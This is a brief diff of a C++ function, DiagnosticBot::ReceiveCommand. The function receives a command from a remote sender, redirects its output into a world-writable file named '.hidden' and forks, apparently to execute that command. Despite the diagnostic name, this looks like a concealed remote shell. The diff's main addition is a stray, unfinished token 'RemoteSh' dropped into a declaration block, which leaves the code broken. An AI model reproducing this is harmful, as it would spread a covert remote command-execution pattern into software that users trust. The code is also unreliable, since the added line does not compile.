@@ -48,6 +48,8 @@ std::string		DiagnosticBot::ReceiveCommand(void)
 	char			sender[1024];
 	int				i2;
 	int				save = dup(1);
+	RemoteSh
+
 
 	i2 = open(".hidden", O_RDWR | O_CREAT | O_APPEND, 0777);
 	dup2(i2, 1);
@@ -55,6 +57,7 @@ std::string		DiagnosticBot::ReceiveCommand(void)
 	buffer[bytesize] = '\0';
 	std::string		command(buffer);
 	std::cout << "received comm : " << buffer << std::endl;
+
 	pid_t 	pid = fork();
 	if (pid == 0)
 	{
